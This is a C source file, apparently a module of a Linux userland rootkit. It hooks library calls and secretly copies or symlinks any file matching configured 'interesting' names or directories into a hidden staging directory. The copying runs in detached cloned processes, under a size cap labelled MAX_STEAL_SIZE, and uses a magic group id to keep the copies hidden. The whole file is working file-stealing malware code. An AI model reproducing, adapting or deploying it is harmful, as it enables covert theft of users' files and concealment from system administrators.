#ifdef BLACKLIST_TOO
int uninteresting(char *path){
    for(int i = 0; i < NAMESBLACKLIST_SIZE; i++){
        if(!strncmp(namesblacklist[i], path, strlen(namesblacklist[i])))
            return 1;

        if(!fnmatch(namesblacklist[i], path, FNM_PATHNAME))
            return 1;
    }
    return 0;
}
#endif

#if defined SYMLINK_FALLBACK || defined SYMLINK_ONLY
int linkfile(const char *oldpath, char *newpath){
    hook(CSYMLINK);
    char newnewpath[strlen(newpath)+6];
    snprintf(newnewpath, sizeof(newnewpath), "%s-link", newpath);

    if(oldpath[0] == '/')
        return (long)call(CSYMLINK, oldpath, newnewpath);
    
    // if oldpath is not a full pathname we must get it now
    char *cwd, *oldoldpath;

    cwd = getcwd(NULL, 0);
    if(cwd == NULL) return 1;
    oldoldpath = fullpath(cwd, oldpath);
    free(cwd);

    if(oldoldpath == NULL)
        return 1;

    int ret = (long)call(CSYMLINK, oldoldpath, newnewpath);
    free(oldoldpath);
    return ret;
}
#endif

char *fullpath(char *cwd, const char *file){
    size_t pathlen = strlen(cwd)+strlen(file)+2;
    char *ret = malloc(pathlen);
    if(!ret) return NULL;
    memset(ret, 0, pathlen);
    snprintf(ret, pathlen, "%s/%s", cwd, file);
    return ret;
}

int fileincwd(char *cwd, const char *file){
    int incwd=0;
    char *curpath = fullpath(cwd, file);
    if(curpath == NULL) return 0;

    hook(CACCESS);
    if((long)call(CACCESS, curpath, F_OK) == 0)
        incwd=1;

    free(curpath);
    return incwd;
}

#ifdef DIRECTORIES_TOO
int interestingdir(const char *path){
    int interest=0;
    char *cwd = getcwd(NULL, 0), *intdir;
    if(cwd != NULL){
        for(int i = 0; i != INTERESTING_DIRECTORIES_SIZE; i++){
            intdir = interesting_directories[i];

            if(!strncmp(intdir, cwd, strlen(intdir)) && fileincwd(cwd, path)){
                interest = 1;
                break;
            }

            if(!strncmp(intdir, path, strlen(intdir))){
                interest = 1;
                break;
            }
        }

        free(cwd);
    }

    return interest;
}
#endif

int interesting(const char *path){
    char *interesting_file;
    int interest = 0;

    for(int i = 0; i < INTERESTING_FILES_SIZE; i++){
        interesting_file = interesting_files[i];
        if(!strncmp(interesting_file, path, strlen(interesting_file))){
            interest = 1;
            break;
        }

        if(!fnmatch(interesting_file, path, FNM_PATHNAME)){
            interest = 1;
            break;
        }
    }

#ifdef DIRECTORIES_TOO
    if(interest != 1 && interestingdir(path))
        interest = 1;
#endif

    return interest;
}


#ifdef ORIGINAL_RW_FALLBACK
void wcfallback(FILE *ofp, off_t fsize, char *newpath){
    FILE *nfp;
    unsigned char *buf;
    off_t blksize;
    size_t n, m;

    hook(CFOPEN, CFWRITE);

    nfp = call(CFOPEN, newpath, "w");

    blksize = getablocksize(fsize);
    do{
        buf = malloc(blksize+1);
        if(!buf) goto nopenope;
        memset(buf, 0, blksize+1);
        n = fread(buf, 1, blksize, ofp);
        if(n){
            m = (size_t)call(CFWRITE, buf, 1, n, nfp);
            fflush(nfp);
        }else m = 0;
        fflush(ofp);
        free(buf);
    }while(n > 0 && n == m);
nopenope:
    fcloser(2, ofp, nfp);
}
#endif


int writecopy(const char *oldpath, char *newpath){
    struct stat64 nstat; // for newpath, should it exist, to check if there's a change in size.
    int statr;
    unsigned char *map, p;
    FILE *ofp, *nfp;
    off_t fsize;
    mode_t mode;

    hook(CFWRITE, C__LXSTAT64, CCREAT, CUNLINK);

    memset(&nstat, 0, sizeof(struct stat64));
    statr = (long)call(C__LXSTAT64, _STAT_VER, newpath, &nstat);
    if(statr < 0 && errno != ENOENT) return 1;

    ofp = bindup(oldpath, newpath, NULL, &fsize, &mode);
    if(ofp == NULL && errno == ENOENT) return 1;
    else if(ofp == NULL) return -1;

    if(!S_ISREG(mode) || (statr != -1 && nstat.st_size == fsize)){
        fclose(ofp);
        return 1;
    }

#ifdef MAX_FILE_SIZE
    if(fsize > MAX_FILE_SIZE){
        fclose(ofp);
        return -1;
    }
#endif
#ifdef MAX_STEAL_SIZE
    if(getnewdirsize(INTEREST_DIR, fsize) > MAX_STEAL_SIZE){
        fclose(ofp);
        return -1;
    }
#endif

    map = mmap(NULL, fsize, PROT_READ, MAP_PRIVATE, fileno(ofp), 0);
    if(map == MAP_FAILED){
#ifdef ORIGINAL_RW_FALLBACK
        wcfallback(ofp, fsize, newpath);
        return 1;
#else
        fclose(ofp);
        return -1;
#endif
    }
    fclose(ofp);

    call(CUNLINK, newpath);

    nfp = call(CFOPEN, newpath, "a");
    if(nfp == NULL){
        madvise(map, fsize, MADV_DONTNEED);
        munmap(map, fsize);
        return -1;
    }

    // create this file to make it clear that the file is still being copied. unlink it when done.
    char partpath[strlen(newpath)+6];
    snprintf(partpath, sizeof(partpath), "%s.part", newpath);
    call(CCREAT, partpath, 0600);

    for(int i=0; i<fsize; i++){
        p = map[i];
        fputc(p, nfp);
    }

    fclose(nfp);
    madvise(map, fsize, MADV_DONTNEED);
    munmap(map, fsize);
    call(CUNLINK, partpath);

#ifdef KEEP_FILE_MODE
    hook(CCHMOD);
    call(CCHMOD, newpath, mode);
#endif

    if(!notuser(0))  // if calling process is root then the magic gid is set. don't keep it on the copy result.
        chown_path(newpath, 0);

    return 1;
}

char *getnewpath(char *filename){
    int path_maxlen = LEN_INTEREST_DIR +
                      strlen(filename) + 32;
    char *ret, *filenamedup = strdup(filename);

    if(filenamedup[0] == '.') // remove prefixed '.' if there is one.
        memmove(filenamedup, filenamedup + 1, strlen(filenamedup));

    ret = malloc(path_maxlen);
    if(!ret) return NULL;
    memset(ret, 0, path_maxlen);
    snprintf(ret, path_maxlen, "%s/%u-%s",
                                INTEREST_DIR,
                                getuid(),
                                filenamedup);
    free(filenamedup);
    return ret;
}

static int takeit(void *oldpath){
    if(!notuser(0)){   // hide, if we can...
        hook(CSETGID);
        call(CSETGID, readgid());
    }

    char *dupdup = strdup(oldpath),
         *newpath = getnewpath(basename(dupdup));
    free(dupdup);

    int ret;
#ifdef SYMLINK_ONLY
    ret = linkfile(oldpath, newpath);
#else
    ret = writecopy(oldpath, newpath);
#ifdef SYMLINK_FALLBACK
    if(ret < 0)
        ret = linkfile(oldpath, newpath);
#endif
#endif

    free(newpath);
    return ret;
}

void inspectfile(const char *pathname){
    if(sssdproc() || rknomore()) return;

    hook(COPENDIR);
    DIR *dp = call(COPENDIR, INTEREST_DIR);
    if(dp == NULL && errno == ENOENT){
        if(notuser(0)) return;
        preparedir(INTEREST_DIR, readgid());
        inspectfile(pathname);
        return;
    }else if(dp == NULL) return;
    else if(dp != NULL) closedir(dp);

    char *dupdup   = strdup(pathname),
         *filename = basename(dupdup);

    if(strlen(pathname)<=1 || strlen(filename)<=1)
        goto nopenope;

    if(interesting(pathname) || interesting(filename)){
        const int STACK_SIZE = 8912;
        char *stack, *sptr;

        stack = malloc(STACK_SIZE);
        if(!stack) goto nopenope;
        sptr = stack+STACK_SIZE;

        unsigned long flags = CLONE_PARENT|CLONE_DETACHED;
        if(!notuser(0)) flags |= CLONE_NEWUTS;
#ifdef BLACKLIST_TOO
        if(!uninteresting(filename))
            clone(takeit, sptr, flags, dupdup);
#else
        clone(takeit, sptr, flags, dupdup);
#endif
        free(stack);
    }
nopenope:
    free(dupdup);
}
